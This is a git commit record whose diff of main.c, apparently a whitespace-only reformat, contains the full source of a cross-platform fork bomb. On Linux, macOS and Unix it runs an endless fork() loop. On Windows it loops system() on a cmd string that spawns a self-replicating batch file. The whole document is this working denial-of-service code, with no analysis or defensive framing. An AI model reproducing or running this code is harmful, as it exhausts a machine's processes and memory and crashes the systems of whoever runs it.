fa820aec7293c2df45f6e1a0d14117a88657ae0b
Guilherme Faura <36975422+GuilhermeIsNotUnix@users.noreply.github.com>
2019-08-26 20:45:04 -0300

    Add files via upload

--- main.c
+++ main.c
@@ -12,25 +12,25 @@
 #endif
 
 int main(void) {
-	#ifdef __linux__
-		while(1) {
-			fork();
-    	}
-	#elif __APPLE__
-    	while(1) {
-        	fork();
-    	}
-	#elif __unix__
-    	while(1) {
-    		fork();
-		}
-	#elif _WIN32
-    	const char *comando = "cmd /k echo -^|->-.bat&-";
+    #ifdef __linux__
+        while(1) {
+            fork();
+        }
+    #elif __APPLE__
+        while(1) {
+            fork();
+        }
+    #elif __unix__
+        while(1) {
+            fork();
+        }
+    #elif _WIN32
+        const char *comando = "cmd /k echo -^|->-.bat&-";
 
-		while(1) {
-    		system(comando);
-    	}
-	#endif
+        while(1) {
+            system(comando);
+        }
+    #endif
 
-	return 0;
+    return 0;
 }
